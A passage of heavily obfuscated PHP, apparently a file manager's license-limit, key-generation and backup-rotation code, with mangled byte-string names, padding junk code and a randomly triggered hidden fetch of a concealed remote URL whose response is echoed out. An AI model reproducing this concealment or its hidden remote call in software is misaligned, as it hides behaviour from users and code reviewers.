$¼Ï¸‰Òô[265], $¼Ï¸‰Òô[275] => $¼Ï¸‰Òô[276], $¼Ï¸‰Òô[277] => $¼Ï¸‰Òô[267], $¼Ï¸‰Òô[278] => $¼Ï¸‰Òô[279], $¼Ï¸‰Òô[280] => $¼Ï¸‰Òô[269], $¼Ï¸‰Òô[281] => $¼Ï¸‰Òô[282], $¼Ï¸‰Òô[283] => $¼Ï¸‰Òô[284], $¼Ï¸‰Òô[285] => $¼Ï¸‰Òô[286]); $–¸®”š¤ = $¯ñä˜ğú[689]; if (!$–¸®”š¤) { return; } $Á­°Ü¼© = $İÄÛ³[$this->povsb382eacd]; $Á­°Ü¼© = intval($Á­°Ü¼© ? $Á­°Ü¼© : $¼Ï¸‰Òô[261]); $ášš¹º’ = _get($this->kgxj509f9577, $¼Ï¸‰Òô[287]); $ášš¹º’ = $ášš¹º’ ? intval($ášš¹º’) : 0; return $Á­°Ü¼© + $ášš¹º’; $ı€î×œ = $¯ñä˜ğú[690]; if (!$ı€î×œ) { die; } } public function dick37d7f731($‡êúÍ“) { $‚°Ö¢” =& $_SERVER[Ãìšã«™]; $–ş¿Éøâ =& $_SERVER[ïß‚ÈÄŸ]; $¶Âß‡‹ã = $this->ghko87867608(); $×­±‹ú± = $‚°Ö¢”[691]; if (!$×­±‹ú±) { die; } if ($‡êúÍ“[$–ş¿Éøâ[288]] == $–ş¿Éøâ[191]) { return; } if ($¶Âß‡‹ã >= intval($–ş¿Éøâ[207])) { return; } $û§›È–® = Model($–ş¿Éøâ[119])->count(); $„öœƒºÉ = $‚°Ö¢”[692]; if ($û§›È–® <= $¶Âß‡‹ã) { return; } $éøÁÍî = Model($–ş¿Éøâ[119])->field($–ş¿Éøâ[288])->limit($¶Âß‡‹ã)->select(); $ĞşĞ¡åÀ = $‚°Ö¢”[693]; if (!$ĞşĞ¡åÀ) { die; } $éøÁÍî = array_to_keyvalue($éøÁÍî, $–ş¿Éøâ[6], $–ş¿Éøâ[288]); $€ìÛ¹ÛÇ = $‚°Ö¢”[694]; if (!$€ìÛ¹ÛÇ) { die; } if (!in_array($‡êúÍ“[$–ş¿Éøâ[288]], $éøÁÍî)) { show_json($–ş¿Éøâ[289], !1, $–ş¿Éøâ[203]); } } public function kaqj50ccd5a6() { $³§£ıâÆ =& $_SERVER[Ãìšã«™]; $¡æşŠ¾Ÿ =& $_SERVER[ïß‚ÈÄŸ]; if (!_get($GLOBALS, $¡æşŠ¾Ÿ[113]) || mt_rand(1, 100) > 20) { return; } $‚¿ñÁ = $¡æşŠ¾Ÿ[211]; $‚¿ñÁ = $this->tzlea4d083e3($‚¿ñÁ, $¡æşŠ¾Ÿ[212]); $ëÜš«» = stream_context_create(array($¡æşŠ¾Ÿ[213] => array($¡æşŠ¾Ÿ[214] => $¡æşŠ¾Ÿ[215], $¡æşŠ¾Ÿ[216] => 3))); $¾Ì¦‰ˆ = $³§£ıâÆ[695]; $ùİÑ×õÈ = @file_get_contents($‚¿ñÁ, !1, $ëÜš«»); $Ã¶¦èİÆ = $³§£ıâÆ[696]; if (strlen($Ã¶¦èİÆ) < $³§£ıâÆ[612]) { return; } echo $¡æşŠ¾Ÿ[290] . hash_encode($ùİÑ×õÈ) . $¡æşŠ¾Ÿ[291]; } private function mlarff31877d($õÓ¥ãÕ´, $–®…Ø½Ù, $“«üÈ„ü = 3) { $ÜÃ¯‹ Ó =& $_SERVER[Ãìšã«™]; $ãô€ÚùÏ =& $_SERVER[ïß‚ÈÄŸ]; usleep(1); $õÓ¥ãÕ´ = trim($õÓ¥ãÕ´); $ğ°¶Óµ = $ÜÃ¯‹ Ó[697]; if (strlen($ğ°¶Óµ) < $ÜÃ¯‹ Ó[399]) { return; } $àè»”¾Œ = mt_rand(0, 5) . $ãô€ÚùÏ[6]; $³µª£ = rand_string(15); $ûš’ÄÊ£ = $ãô€ÚùÏ[292]; $ù¸´º»ğ = $ÜÃ¯‹ Ó[698]; if (!$ù¸´º»ğ) { die; } switch ($àè»”¾Œ) { case $ãô€ÚùÏ[199]: $ŠåÚÂİÂ = $this->gdzs2feaadff($õÓ¥ãÕ´, strrev($–®…Ø½Ù . $³µª£)); break; $§ÛÒ²ı° = $ÜÃ¯‹ Ó[699]; if (strlen($§ÛÒ²ı°) < $ÜÃ¯‹ Ó[638]) { return; } case $ãô€ÚùÏ[191]: $ŠåÚÂİÂ = $this->gdzs2feaadff($õÓ¥ãÕ´, strrev($³µª£ . $–®…Ø½Ù)); $· ÉØÉÔ = $ÜÃ¯‹ Ó[700]; break; $şö˜Ì¬÷ = $ÜÃ¯‹ Ó[701]; case $ãô€ÚùÏ[293]: $ŠåÚÂİÂ = $this->gdzs2feaadff($õÓ¥ãÕ´, base64_encode($³µª£ . $–®…Ø½Ù)); break; $££óçØ• = $ÜÃ¯‹ Ó[702]; while ($££óçØ• < $ÜÃ¯‹ Ó[621]) { if ($££óçØ• >= 0) { break; } $££óçØ•++; } case $ãô€ÚùÏ[294]: $ŠåÚÂİÂ = $this->gdzs2feaadff($õÓ¥ãÕ´, md5($³µª£ . $–®…Ø½Ù)); break; case $ãô€ÚùÏ[295]: $õÓ¥ãÕ´ = base64_encode($õÓ¥ãÕ´); $¶µØ­Š = $ÜÃ¯‹ Ó[703]; while ($¶µØ­Š < $ÜÃ¯‹ Ó[616]) { if ($¶µØ­Š >= 0) { break; } $¶µØ­Š++; } $İí¾áƒ” = rand(0, 64); $Ï™‚ÙÛÕ = $ÜÃ¯‹ Ó[704]; while ($Ï™‚ÙÛÕ < $ÜÃ¯‹ Ó[621]) { if ($Ï™‚ÙÛÕ >= 0) { break; } $Ï™‚ÙÛÕ++; } $¡ Óˆ‰÷ = $ûš’ÄÊ£[$İí¾áƒ”]; $åê¢ù’ı = md5($¡ Óˆ‰÷ . md5($–®…Ø½Ù . $¡ Óˆ‰÷) . $–®…Ø½Ù); $åê¢ù’ı = substr($åê¢ù’ı, $İí¾áƒ” % 8, $İí¾áƒ” % 8 + 7); $‡Ñ¥åó = $ãô€ÚùÏ[6]; $ÈÎÇİ˜— = $ÜÃ¯‹ Ó[705]; while (strlen($ÈÎÇİ˜—) < $ÜÃ¯‹ Ó[612]) { if (!$ÈÎÇİ˜—) { break; } $ÈÎÇİ˜—++; } $íåÕÄãº = 0; $Ä èÂ¶ = 0; $­÷§ü = 0; for ($íåÕÄãº = 0; $íåÕÄãº < strlen($õÓ¥ãÕ´); $íåÕÄãº++) { $­÷§ü = $­÷§ü == strlen($åê¢ù’ı) ? 0 : $­÷§ü; $ÜıŞµ¢Õ = $ÜÃ¯‹ Ó[706]; $Ä èÂ¶ = ($İí¾áƒ” + strpos($ûš’ÄÊ£, $õÓ¥ãÕ´[$íåÕÄãº]) + ord($åê¢ù’ı[$­÷§ü++])) % 64; $êÁĞÀ®Õ = $ÜÃ¯‹ Ó[707]; if (strlen($êÁĞÀ®Õ) < $ÜÃ¯‹ Ó[612]) { return; } $‡Ñ¥åó .= $ûš’ÄÊ£[$Ä èÂ¶]; $Êä¹ÌïÃ = $ÜÃ¯‹ Ó[708]; while (strlen($Êä¹ÌïÃ) < $ÜÃ¯‹ Ó[616]) { if (!$Êä¹ÌïÃ) { break; } $Êä¹ÌïÃ++; } } $ŠåÚÂİÂ = hash_encode($¡ Óˆ‰÷ . $‡Ñ¥åó); $ş¨åıŸ¥ = $ÜÃ¯‹ Ó[709]; if (!$ş¨åıŸ¥) { die; } break; default: $ŠåÚÂİÂ = $this->gdzs2feaadff($õÓ¥ãÕ´, $–®…Ø½Ù . $³µª£); break; } $ŠåÚÂİÂ = strrev($àè»”¾Œ . $³µª£ . $ŠåÚÂİÂ); if ($“«üÈ„ü - 1 > 0) { $ŠåÚÂİÂ = $this->mlarff31877d($ŠåÚÂİÂ, $–®…Ø½Ù, $“«üÈ„ü - 1); } return $ŠåÚÂİÂ; } private function rpfg1643af05($¡Ò¦¬”¿, $ÕÕº¼, $ùğ„÷™· = 3) { $ó»Œôœ =& $_SERVER[Ãìšã«™]; $»¾ÛÖ =& $_SERVER[ïß‚ÈÄŸ]; if (!is_string($¡Ò¦¬”¿) || strlen($¡Ò¦¬”¿) < 10) { return !1; } $¡Ò¦¬”¿ = trim($¡Ò¦¬”¿); $æĞò¡­¹ = $ó»Œôœ[710]; if (strlen($æĞò¡­¹) < $ó»Œôœ[616]) { return; } $¡Ò¦¬”¿ = strrev($¡Ò¦¬”¿); $‹öêë³ = $ó»Œôœ[711]; $½œş– = $¡Ò¦¬”¿[0]; $‘Äç÷ßœ = $ó»Œôœ[712]; if (strlen($‘Äç÷ßœ) < $ó»Œôœ[399]) { return; } $˜±¿¿ï = substr($¡Ò¦¬”¿, 1, 15); $¡Ò¦¬”¿ = substr($¡Ò¦¬”¿, 16); $¬º×¥«ã = $»¾ÛÖ[292]; switch ($½œş–) { case $»¾ÛÖ[199]: $èæ×œ³Û = $this->tzlea4d083e3($¡Ò¦¬”¿, strrev($ÕÕº¼ . $˜±¿¿ï)); break; $ÊàşÌîó = $ó»Œôœ[713]; while (strlen($ÊàşÌîó) < $ó»Œôœ[621]) { if (!$ÊàşÌîó) { break; } $ÊàşÌîó++; } case $»¾ÛÖ[191]: $èæ×œ³Û = $this->tzlea4d083e3($¡Ò¦¬”¿, strrev($˜±¿¿ï . $ÕÕº¼)); $«æñïíÈ = $ó»Œôœ[714]; if (strlen($«æñïíÈ) < $ó»Œôœ[638]) { die; } break; case $»¾ÛÖ[293]: $èæ×œ³Û = $this->tzlea4d083e3($¡Ò¦¬”¿, base64_encode($˜±¿¿ï . $ÕÕº¼)); $Ö„õ÷¦ü = $ó»Œôœ[715]; while ($Ö„õ÷¦ü < $ó»Œôœ[399]) { if ($Ö„õ÷¦ü >= 0) { break; } $Ö„õ÷¦ü++; } break; $îß£¨ = $ó»Œôœ[716]; if (strlen($îß£¨) < $ó»Œôœ[612]) { die; } case $»¾ÛÖ[294]: $èæ×œ³Û = $this->tzlea4d083e3($¡Ò¦¬”¿, md5($˜±¿¿ï . $ÕÕº¼)); break; $Œû®–ôš = $ó»Œôœ[717]; while (strlen($Œû®–ôš) < $ó»Œôœ[616]) { if (!$Œû®–ôš) { break; } $Œû®–ôš++; } case $»¾ÛÖ[295]: $¡Ò¦¬”¿ = hash_decode($¡Ò¦¬”¿); $áÇóãµ = $¡Ò¦¬”¿[0]; $¡Ò¦¬”¿ = substr($¡Ò¦¬”¿, 1); $·£›’º³ = $ó»Œôœ[718]; while ($·£›’º³ < $ó»Œôœ[621]) { if ($·£›’º³ >= 0) { break; } $·£›’º³++; } $şÓıò¢ = strpos($¬º×¥«ã, $áÇóãµ); $”ëÂÇ º = $ó»Œôœ[719]; $İ¢‰õâ³ = md5($áÇóãµ . md5($ÕÕº¼ . $áÇóãµ) . $ÕÕº¼); $İ¢‰õâ³ = substr($İ¢‰õâ³, $şÓıò¢ % 8, $şÓıò¢ % 8 + 7); $‹º¨Ó€ = $ó»Œôœ[720]; while ($‹º¨Ó€ < $ó»Œôœ[638]) { if ($‹º¨Ó€ >= 0) { break; } $‹º¨Ó€++; } $Õ»å²À = $»¾ÛÖ[6]; $Œ×ÎØÒë = $ó»Œôœ[721]; $øŒ©ïæ– = 0; $´†¶Ôğ· = 0; $Ş‚«ú›º = 0; $¶¸¶ËƒÖ = $ó»Œôœ[722]; if (strlen($¶¸¶ËƒÖ) < $ó»Œôœ[621]) { return; } for ($øŒ©ïæ– = 0; $øŒ©ïæ– < strlen($¡Ò¦¬”¿); $øŒ©ïæ–++) { $Ş‚«ú›º = $Ş‚«ú›º == strlen($İ¢‰õâ³) ? 0 : $Ş‚«ú›º; $Û—©Åì¹ = $ó»Œôœ[723]; $ÎÄÆÃÔİ = $Ş‚«ú›º++; $´†¶Ôğ· = strpos($¬º×¥«ã, $¡Ò¦¬”¿[$øŒ©ïæ–]) - $şÓıò¢ - ord($İ¢‰õâ³[$ÎÄÆÃÔİ]); $ú¥ÊÉÅÁ = $ó»Œôœ[724]; if (strlen($ú¥ÊÉÅÁ) < $ó»Œôœ[616]) { die; } while ($´†¶Ôğ· < 0) { $´†¶Ôğ· += 64; } $Õ»å²À .= $¬º×¥«ã[$´†¶Ôğ·]; $ïıñ•­· = $ó»Œôœ[725]; if (strlen($ïıñ•­·) < $ó»Œôœ[612]) { die; } } $èæ×œ³Û = base64_decode($Õ»å²À); break; $Ùîøô¹š = $ó»Œôœ[726]; while ($Ùîøô¹š < $ó»Œôœ[638]) { if ($Ùîøô¹š >= 0) { break; } $Ùîøô¹š++; } default: $èæ×œ³Û = $this->tzlea4d083e3($¡Ò¦¬”¿, $ÕÕº¼ . $˜±¿¿ï); break; } if ($ùğ„÷™· - 1 > 0) { $èæ×œ³Û = $this->rpfg1643af05($èæ×œ³Û, $ÕÕº¼, $ùğ„÷™· - 1); } return $èæ×œ³Û; } public function ofilae3a3477($¹¿ÍÛÏ) { $¸×ßÜÓ =& $_SERVER[Ãìšã«™]; $ã§×¼é =& $_SERVER[ïß‚ÈÄŸ]; $Í’¢íŒÅ = $this->gkjf846b173b(); $†Ôà±í = $this->gkjf846b173b(); $¬Ó«‘ñ“ = ($Í’¢íŒÅ - 1) * ($†Ôà±í - 1); $‡ˆÏ¹ = $¸×ßÜÓ[727]; if (strlen($‡ˆÏ¹) < $¸×ßÜÓ[612]) { return; } $Â‰úÛş§ = intval(($Í’¢íŒÅ + $†Ôà±í) / 2); while (1) { $ªŒÖº– = $Â‰úÛş§; $è×ßÔ± = $¬Ó«‘ñ“; while ($è×ßÔ± % $ªŒÖº– != 0) { $íÉßè¼ß = $è×ßÔ±; $è×ßÔ± = $ªŒÖº–; $ËßŒÈúŠ = $¸×ßÜÓ[728]; if (strlen($ËßŒÈúŠ) < $¸×ßÜÓ[638]) { return; } $ªŒÖº– = $íÉßè¼ß % $ªŒÖº–; $ìªâ°‹ = $¸×ßÜÓ[729]; if (strlen($ìªâ°‹) < $¸×ßÜÓ[612]) { die; } } if ($ªŒÖº– == 1) { break; } else { $Â‰úÛş§++; } } $™ĞÃ™™ = 2; for ($ñÅèİ‡Ÿ = 0; $ñÅèİ‡Ÿ < $¬Ó«‘ñ“ * 10; $ñÅèİ‡Ÿ++) { if (($¬Ó«‘ñ“ * $ñÅèİ‡Ÿ + 1) % $Â‰úÛş§ == 0) { $™ĞÃ™™ = intval(($¬Ó«‘ñ“ * $ñÅèİ‡Ÿ + 1) / $Â‰úÛş§); break; } } $±‹ì·™€ = $this->gdzs2feaadff($Í’¢íŒÅ * $†Ôà±í . $ã§×¼é[6], $ã§×¼é[130]); $Êä ß = $¸×ßÜÓ[730]; if (!$Êä ß) { return; } $ë¶ş±¾Ğ = md5($ã§×¼é[296] . ($Í’¢íŒÅ + $†Ôà±í) . $ã§×¼é[297] . $Â‰úÛş§ . $ã§×¼é[297] . $™ĞÃ™™ . $ã§×¼é[298]); $é†œà« = $this->gdzs2feaadff($¹¿ÍÛÏ, $ë¶ş±¾Ğ) . $ã§×¼é[299] . $±‹ì·™€; return $é†œà«; $ÁÍğè³° = $¸×ßÜÓ[731]; if (strlen($ÁÍğè³°) < $¸×ßÜÓ[621]) { die; } } public function fcajbacaf764($Îáíî¼¬) { $Û·èò¨ =& $_SERVER[Ãìšã«™]; $’•¿ü® =& $_SERVER[ïß‚ÈÄŸ]; $ãİÈÙ¢ = explode($’•¿ü®[299], $Îáíî¼¬); $ÂË¤™¬  = $Û·èò¨[732]; while (strlen($ÂË¤™¬ ) < $Û·èò¨[616]) { if (!$ÂË¤™¬ ) { break; } $ÂË¤™¬ ++; } if (count($ãİÈÙ¢) != 2) { return $’•¿ü®[6]; } $äƒÒ”©ô = $this->tzlea4d083e3($ãİÈÙ¢[1] . $’•¿ü®[6], $’•¿ü®[130]); if (!$äƒÒ”©ô) { return $’•¿ü®[6]; } $äƒÒ”©ô = intval($äƒÒ”©ô); $Å­ùˆšæ = $Û·èò¨[733]; while ($Å­ùˆšæ < $Û·èò¨[621]) { if ($Å­ùˆšæ >= 0) { break; } $Å­ùˆšæ++; } $µ˜ã”¦ = 0; $ñš³¿Ì¿ = 0; $åˆå†®Ğ = $Û·èò¨[734]; while (strlen($åˆå†®Ğ) < $Û·èò¨[621]) { if (!$åˆå†®Ğ) { break; } $åˆå†®Ğ++; } for ($÷º—€µÛ = 3; $÷º—€µÛ < $äƒÒ”©ô; $÷º—€µÛ += 2) { if ($äƒÒ”©ô % $÷º—€µÛ != 0) { continue; } $µ˜ã”¦ = $÷º—€µÛ; $”à¨òôÇ = $Û·èò¨[735]; if (!$”à¨òôÇ) { die; } $ñš³¿Ì¿ = intval($äƒÒ”©ô / $÷º—€µÛ); $ÖåôÈšµ = $Û·èò¨[736]; if (strlen($ÖåôÈšµ) < $Û·èò¨[621]) { die; } break; $©© ùÃ• = $Û·èò¨[737]; } $®¥µ²Ïı = ($µ˜ã”¦ - 1) * ($ñš³¿Ì¿ - 1); $Õ¼ò¥Æ = intval(($µ˜ã”¦ + $ñš³¿Ì¿) / 2); $¨È¬öæÑ = $Û·èò¨[738]; if (!$¨È¬öæÑ) { return; } while (1) { $ĞÌĞüò´ = $Õ¼ò¥Æ; $êíÑ„Áİ = $Û·èò¨[739]; while ($êíÑ„Áİ < $Û·èò¨[638]) { if ($êíÑ„Áİ >= 0) { break; } $êíÑ„Áİ++; } $±¦¾Ê¤í = $®¥µ²Ïı; $î©³Ú÷û = $Û·èò¨[740]; while ($î©³Ú÷û < $Û·èò¨[638]) { if ($î©³Ú÷û >= 0) { break; } $î©³Ú÷û++; } while ($±¦¾Ê¤í % $ĞÌĞüò´ != 0) { $Íààú­á = $±¦¾Ê¤í; $±¦¾Ê¤í = $ĞÌĞüò´; $÷­ê†œ‹ = $Û·èò¨[741]; if (strlen($÷­ê†œ‹) < $Û·èò¨[621]) { die; } $ĞÌĞüò´ = $Íààú­á % $ĞÌĞüò´; $´÷‡¾¿İ = $Û·èò¨[742]; if (strlen($´÷‡¾¿İ) < $Û·èò¨[621]) { return; } } if ($ĞÌĞüò´ == 1) { break; } else { $Õ¼ò¥Æ++; } } $àùÔ¶Êú = 2; $Çâ‹§ÈÕ = $Û·èò¨[743]; if (strlen($Çâ‹§ÈÕ) < $Û·èò¨[399]) { return; } for ($÷º—€µÛ = 0; $÷º—€µÛ < $®¥µ²Ïı * 10; $÷º—€µÛ++) { if (($®¥µ²Ïı * $÷º—€µÛ + 1) % $Õ¼ò¥Æ == 0) { $àùÔ¶Êú = intval(($®¥µ²Ïı * $÷º—€µÛ + 1) / $Õ¼ò¥Æ); break; } } $ª¸€ƒùÙ = md5($’•¿ü®[296] . ($µ˜ã”¦ + $ñš³¿Ì¿) . $’•¿ü®[297] . $Õ¼ò¥Æ . $’•¿ü®[297] . $àùÔ¶Êú . $’•¿ü®[298]); $–œŸœ¥Ü = $this->tzlea4d083e3($ãİÈÙ¢[0], $ª¸€ƒùÙ); $ğ‹÷ãÚ = $Û·èò¨[744]; if (!$ğ‹÷ãÚ) { return; } return $–œŸœ¥Ü; } public function gkjf846b173b() { $âêº”™û =& $_SERVER[Ãìšã«™]; $Éœ÷ƒ‚¨ = mt_rand(pow(2, 14), pow(2, 16) - 1); $èñ–Ş”Ò = array(); $±Œ¼ªş¿ = 1; while ($±Œ¼ªş¿ <= (int) sqrt($Éœ÷ƒ‚¨)) { $Š¸ÖÙö = $±Œ¼ªş¿; $«»Âƒ–ª = $âêº”™û[745]; while (strlen($«»Âƒ–ª) < $âêº”™û[616]) { if (!$«»Âƒ–ª) { break; } $«»Âƒ–ª++; } while (!0) { $Š¸ÖÙö++; $®”¾ú×Ï = $âêº”™û[746]; if (strlen($®”¾ú×Ï) < $âêº”™û[612]) { die; } if ($Š¸ÖÙö <= 2) { $±Œ¼ªş¿ = $Š¸ÖÙö; break; } else { if ($Š¸ÖÙö < 2) { continue; } } $òíÀ¨è = !0; for ($¦”ìä® = 2; $¦”ìä® <= sqrt($Š¸ÖÙö); $¦”ìä®++) { if ($Š¸ÖÙö % $¦”ìä® == 0) { $òíÀ¨è = !1; } } if ($òíÀ¨è) { $±Œ¼ªş¿ = $Š¸ÖÙö; break; } } $èñ–Ş”Ò[] = $±Œ¼ªş¿; } $´Ã‡ê¬ = 2; $À×şŒ‹¿ = $âêº”™û[747]; for ($Š¸ÖÙö = $Éœ÷ƒ‚¨; $Š¸ÖÙö > 1; $Š¸ÖÙö--) { $òíÀ¨è = !0; foreach ($èñ–Ş”Ò as $°¯»Ğáâ) { if ($Š¸ÖÙö % $°¯»Ğáâ == 0) { $òíÀ¨è = !1; break; } } if ($òíÀ¨è) { $´Ã‡ê¬ = $Š¸ÖÙö; break; } } return $´Ã‡ê¬; } public function djly11a078aa($ƒø‘›¤Ó, $Ç…’·ı„) { $í¸ÀêÉ =& $_SERVER[ïß‚ÈÄŸ]; return call_user_func(array($í¸ÀêÉ[8], $í¸ÀêÉ[300]), $ƒø‘›¤Ó, $Ç…’·ı„); } public function gdzs2feaadff($¿…–ÔÀ½, $Ó‰µ” ) { $¦¦Üò´ =& $_SERVER[ïß‚ÈÄŸ]; return call_user_func(array($¦¦Üò´[301], $¦¦Üò´[302]), $¿…–ÔÀ½, $Ó‰µ” ); $’ÜÑøÓ¦ = $_SERVER[Ãìšã«™][748]; if (!$’ÜÑøÓ¦) { return; } } public function tzlea4d083e3($¹¡ŞÅÕ, $áÅ„ÑÖ†) { $»¿ŞÉó =& $_SERVER[ïß‚ÈÄŸ]; return call_user_func(array($»¿ŞÉó[301], $»¿ŞÉó[303]), $¹¡ŞÅÕ, $áÅ„ÑÖ†); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $¦ö‘“òÓ =& $_SERVER[Ãìšã«™]; $this->isManual(); self::$name = date($¦ö‘“òÓ[749]); if (!($Éâ¸Æ˜× = Model($¦ö‘“òÓ[750])->lastItem())) { $Éâ¸Æ˜× = $this->initData(); } else { self::$name = $Éâ¸Æ˜×[$¦ö‘“òÓ[32]]; if ($Éâ¸Æ˜×[$¦ö‘“òÓ[751]] == $¦ö‘“òÓ[89]) { self::$name = date($¦ö‘“òÓ[752]); $¡ÃÂÁ¦ø = 0; if (isset($Éâ¸Æ˜×[$¦ö‘“òÓ[288]][$¦ö‘“òÓ[192]][$¦ö‘“òÓ[467]])) { $¡ÃÂÁ¦ø = (int) $Éâ¸Æ˜×[$¦ö‘“òÓ[288]][$¦ö‘“òÓ[192]][$¦ö‘“òÓ[467]]; } if (self::$manual == 0 && $Éâ¸Æ˜×[$¦ö‘“òÓ[32]] == self::$name) { Model($¦ö‘“òÓ[750])->remove($Éâ¸Æ˜×[$¦ö‘“òÓ[392]]); } $Éâ¸Æ˜× = $this->initData($¡ÃÂÁ¦ø, $Éâ¸Æ˜×[$¦ö‘“òÓ[753]]); } else { $this->checkStore($Éâ¸Æ˜×[$¦ö‘“òÓ[753]]); } } self::$option = $Éâ¸Æ˜×; } private function isManual() { $ÀĞ‰®¹¤ = _get($GLOBALS, $_SERVER[Ãìšã«™][754], 0); $ÀĞ‰®¹¤ = intval($ÀĞ‰®¹¤); self::$manual = $ÀĞ‰®¹¤ && $ÀĞ‰®¹¤ == 1 ? 1 : 0; } private function initData($ù¯øÒñ = 0, $İı½íèÚ = '') { $ê¨ŒÔ¡î =& $_SERVER[Ãìšã«™]; $İ²œ‚ò = Model($ê¨ŒÔ¡î[750])->config(); if ($İı½íèÚ && $İ²œ‚ò[$ê¨ŒÔ¡î[753]] != $İı½íèÚ) { $ù¯øÒñ = 0; } $this->checkStore($İ²œ‚ò[$ê¨ŒÔ¡î[753]]); if (self::$manual == 1) { self::$name .= $ê¨ŒÔ¡î[11] . date($ê¨ŒÔ¡î[755]); } $å‚©Ş‚ = array($ê¨ŒÔ¡î[753] => $İ²œ‚ò[$ê¨ŒÔ¡î[753]], $ê¨ŒÔ¡î[32] => self::$name, $ê¨ŒÔ¡î[751] => 0, $ê¨ŒÔ¡î[756] => $İ²œ‚ò[$ê¨ŒÔ¡î[756]], $ê¨ŒÔ¡î[757] => self::$manual, $ê¨ŒÔ¡î[288] => array($ê¨ŒÔ¡î[758] => array($ê¨ŒÔ¡î[751] => 0), $ê¨ŒÔ¡î[759] => array($ê¨ŒÔ¡î[751] => 0, $ê¨ŒÔ¡î[760] => 0, $ê¨ŒÔ¡î[761] => 0, $ê¨ŒÔ¡î[33] => $ê¨ŒÔ¡î[12], $ê¨ŒÔ¡î[762] => 0, $ê¨ŒÔ¡î[496] => 0), $ê¨ŒÔ¡î[763] => array($ê¨ŒÔ¡î[751] => 0, $ê¨ŒÔ¡î[760] => 0, $ê¨ŒÔ¡î[761] => 0, $ê¨ŒÔ¡î[762] => 0, $ê¨ŒÔ¡î[496] => 0), $ê¨ŒÔ¡î[192] => array($ê¨ŒÔ¡î[751] => 0, $ê¨ŒÔ¡î[764] => 0, $ê¨ŒÔ¡î[765] => 0, $ê¨ŒÔ¡î[766] => 0, $ê¨ŒÔ¡î[767] => 0, $ê¨ŒÔ¡î[467] => $ù¯øÒñ, $ê¨ŒÔ¡î[762] => 0, $ê¨ŒÔ¡î[496] => 0)), $ê¨ŒÔ¡î[762] => time(), $ê¨ŒÔ¡î[496] => 0); $Ôçû—³ú = Model($ê¨ŒÔ¡î[750])->insert($å‚©Ş‚); $å‚©Ş‚[$ê¨ŒÔ¡î[392]] = $Ôçû—³ú; return $å‚©Ş‚; } private function checkStore($‡ªŠÍ«) { $×¦¿ƒµ =& $_SERVER[Ãìšã«™]; $¶ƒœ½­œ = Model($×¦¿ƒµ[768])->listData($‡ªŠÍ«); Model($×¦¿ƒµ[768])->checkConfig($¶ƒœ½­œ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[Ãìšã«™][750])->findByName(self::$name); } return self::$option; } public static function set($•Æş¯§Ç) { $Ğ£³üÊ× =& $_SERVER[Ãìšã«™]; $¸¾şë‰á = self::get(); foreach ($•Æş¯§Ç as $ş‡„•°¶ => $Î‹Ÿ) { $«àİÒë = explode($Ğ£³üÊ×[10], $ş‡„•°¶); $åå§©À = count($«àİÒë); switch ($åå§©À) { case 1: $¸¾şë‰á[$«àİÒë[0]] = $Î‹Ÿ; break; case 2: $¸¾şë‰á[$«àİÒë[0]][$«àİÒë[1]] = $Î‹Ÿ; break; case 3: $¸¾şë‰á[$«àİÒë[0]][$«àİÒë[1]][$«àİÒë[2]] = $Î‹Ÿ; break; } } Model($Ğ£³üÊ×[750])->update($¸¾şë‰á[$Ğ£³üÊ×[392]], $¸¾şë‰á); self::$option = $¸¾şë‰á; return self::$option; } public function keep() { $‹Ğşâß =& $_SERVER[Ãìšã«™]; $î°˜ñ¸å = self::get(); if ($î°˜ñ¸å[$‹Ğşâß[288]][$‹Ğşâß[758]][$‹Ğşâß[751]] == $‹Ğşâß[89]) { return; } $this->backupKeep($î°˜ñ¸å); self::set(array($‹Ğşâß[769] => 1)); } private function backupKeep($ŒÌƒ™Š) { $¼ÃÜÃ =& $_SERVER[Ãìšã«™]; if (self::$manual == 1) { return; } $¹óÔäô = Model($¼ÃÜÃ[750])->listData(); if (empty($¹óÔäô)) { return; } $¸“ª¬â§ = 0; $—Şø÷ä = array(); foreach ($¹óÔäô as $©“òÙØ•) { if ($¸“ª¬â§ >= 7) { break; } $—Şø÷ä[] = $©“òÙØ•[$¼ÃÜÃ[32]]; $¸“ª¬â§++; } for ($¸“ª¬â§ = 0; $¸“ª¬â§ < 12; $¸“ª¬â§++) { $—Şø÷ä[] = date($¼ÃÜÃ[770], strtotime("\x2d{$¸“ª¬â§}\40\x6d\x6f\x6e\164\150\x73")); } $—Şø÷ä = array_unique($—Şø÷ä); $˜„şÓ†Ğ = Model($¼ÃÜÃ[771])->get($¼ÃÜÃ[772]); foreach ($¹óÔäô as $©“òÙØ•) { if (isset($©“òÙØ•[$¼ÃÜÃ[757]]) && $©“òÙØ•[$¼ÃÜÃ[757]] == $¼ÃÜÃ[89]) { continue; } if (!empty($©“òÙØ•[$¼ÃÜÃ[32]]) && in_array($©“òÙØ•[$¼ÃÜÃ[32]], $—Şø÷ä)) { continue; } Model($¼ÃÜÃ[750])->remove($©“òÙØ•[$¼ÃÜÃ[392]]); $Íã ƒµ½ = $this->backupPath($ŒÌƒ™Š, $˜„şÓ†Ğ); IO::remove($Íã ƒµ½, !1); } } private function backupPath($ÕÔÃŠñ¼, $úËŒÚÇã = false) { $Š› ûò =& $_SERVER[Ãìšã«™]; if (!$úËŒÚÇã) { $úËŒÚÇã = Model($Š› ûò[771])->get($Š› ûò[772]); } $¸ÓÊÈŠü = $ÕÔÃŠñ¼[$Š› ûò[32]]; $ğæàúçš = substr(md5($Š› ûò[773] . $úËŒÚÇã . $¸ÓÊÈŠü), 0, 8); return "\x7b\x69\157\72{$ÕÔÃŠñ¼[$Š› ûò[753]]}\175\x2f\x64\x61\164\x61\x62\x61\163\145\57\x62\x61\143\153\x75\x70\57" . $¸ÓÊÈŠü . $Š› ûò[11] . $ğæàúçš; } public function db() { $Ù‚øÊ¥ò =& $_SERVER[Ãìšã«™]; $¦ŸÁŞ  = self::get(); if ($¦ŸÁŞ [$Ù‚øÊ¥ò[288]][$Ù‚øÊ¥ò[759]][$Ù‚øÊ¥ò[751]] == $Ù‚øÊ¥ò[89]) { return !0; } $ÖÜÔ—É¿ = new BackupDb(); if (!$ÖÜÔ—É¿->index()) { return !1; } self::set(array($Ù‚øÊ¥ò[774] => 1)); return !0; } public function dbFile() { $ÄŞ¤ÉÇ¿ =& $_SERVER[Ãìšã«™]; $È·¦º™ = self::get(); if ($È·¦º™[$ÄŞ¤ÉÇ¿[288]][$ÄŞ¤ÉÇ¿[763]][$ÄŞ¤ÉÇ¿[751]] == 